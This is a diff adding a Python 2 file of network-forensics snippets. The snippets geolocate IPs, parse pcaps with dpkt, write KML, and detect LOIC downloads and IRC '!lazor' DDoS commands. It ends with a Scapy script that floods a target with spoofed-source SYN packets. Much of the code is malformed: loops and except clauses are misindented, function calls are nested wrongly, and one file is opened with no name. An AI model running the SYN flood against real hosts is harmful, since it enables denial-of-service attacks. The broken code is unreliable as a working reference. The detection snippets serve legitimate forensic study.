@@ -1,0 +1,129 @@
+#Using PyGeoIP to Correlate IP to Physical Locations
+import pygeoip
+gi = pygeoip.GeoIP('/opt/GeoIP/Geo.dat')
+def printRecord(tgt):
+  rec = gi.record_by_name(tgt)
+  city = rec['city']
+  region = rec['region_name']
+  country = rec['country_name']
+  long = rec['longitude']
+  lat = rec['latitude']
+  print '[*] Target: ' + tgt + ' Geo-located. '
+  print '[+] '+str(city)+', '+str(region)+', '+str(country)
+  print '[+] Latitude: '+str(lat)+ ', Longitude: '+ str(long)
+  tgt = '173.255.226.98'
+  printRecord(tgt)
+  
+  
+ #Using Dpkt to Parse Packets
+import dpkt
+import socket
+def printPcap(pcap):
+for (ts, buf) in pcap:
+  try:
+    eth = dpkt.ethernet.Ethernet(buf)
+    ip = eth.data
+    src = socket.inet_ntoa(ip.src)
+    dst = socket.inet_ntoa(ip.dst)
+    print '[+] Src: ' + src + ' --> Dst: ' + dst
+  except:
+    pass
+def main():
+  f = open('geotest.pcap')
+  pcap = dpkt.pcap.Reader(f)
+  printPcap(pcap)
+  
+  
+  #Using Python to Build a Google Map
+<?xml version="1.0" encoding="UTF-8"?>
+<kml xmlns="http://www.opengis.net/kml/2.2">
+<Document>
+<Placemark>
+<name>93.170.52.30</name>
+<Point>
+<coordinates>5.750000,52.500000</coordinates>
+</Point>
+</Placemark>
+<Placemark>
+<name>208.73.210.87</name>
+<Point>
+<coordinates>-122.393300,37.769700</coordinates>
+</Point>
+</Placemark>
+</Document>
+</kml>
+
+
+#Using Dpkt to Find the LOIC Download
+import dpkt
+import socket
+def findDownload(pcap):
+for (ts, buf) in pcap:
+ try:
+   eth = dpkt.ethernet.Ethernet(buf)
+   ip = eth.data
+   src = socket.inet_ntoa(ip.src)
+   tcp = ip.data
+   http = dpkt.http.Request(tcp.data)
+   if http.method == 'GET':
+     uri = http.uri.lower()
+   if '.zip' in uri and 'loic' in uri:
+     print '[!] ' + src + ' Downloaded LOIC.'
+     except:
+       pass
+f = open()
+pcap = dpkt.pcap.Reader(f)
+findDownload(pcap)
+
+
+#Parsing IRC Commands to the Hive
+import dpkt
+import socket
+def findHivemind(pcap):
+for (ts, buf) in pcap:
+ try:
+   eth = dpkt.ethernet.Ethernet(buf)
+   ip = eth.data
+   src = socket.inet_ntoa(ip.src)
+   dst = socket.inet_ntoa(ip.dst)
+   tcp = ip.data
+   dport = tcp.dport
+   sport = tcp.sport
+   if dport == 6667:
+     if '!lazor' in tcp.data.lower():
+       print '[!] DDoS Hivemind issued by: '+src
+       print '[+] Target CMD: ' + tcp.data
+   if sport == 6667:
+     if '!lazor' in tcp.data.lower():
+       print '[!] DDoS Hivemind issued to: '+src
+       print '[+] Target CMD: ' + tcp.data
+   except:
+     pass
+     
+     
+#Parsing TTL Fields with Scapy
+from scapy.all import *
+def testTTL(pkt):
+try:
+  if pkt.haslayer(IP):
+    ipsrc = pkt.getlayer(IP).src
+    ttl = str(pkt.ttl)
+    print '[+] Pkt Received From: '+ipsrc+' with TTL: ' \
+    + ttl
+  except:
+    pass
+  def main():
+    sniff(prn=testTTL, store=0)
+    
+
+#Crafting a SYN Flood with Scapy
+from scapy.all import *
+def synFlood(src, tgt):
+for sport in range(1024,65535):
+  IPlayer = IP(src=src, dst=tgt)
+  TCPlayer = TCP(sport=sport, dport=513)
+  pkt = IPlayer / TCPlayer
+  send(pkt)
+src = "10.1.1.2"
+tgt = "192.168.1.3"
+synFlood(src,tgt)
